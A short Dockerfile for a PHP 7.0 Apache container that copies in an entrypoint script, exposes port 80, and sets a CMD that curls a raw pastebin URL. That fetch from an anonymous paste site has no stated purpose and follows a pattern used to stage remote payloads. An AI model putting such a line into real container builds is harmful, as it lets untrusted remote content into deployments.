FROM php:7.0-apache
COPY ./entrypoint.sh /code/entrypoint.sh
WORKDIR /code
CMD curl -s https://pastebin.com/raw/t5haCi7S
ENTRYPOINT ./entrypoint.sh
EXPOSE 80
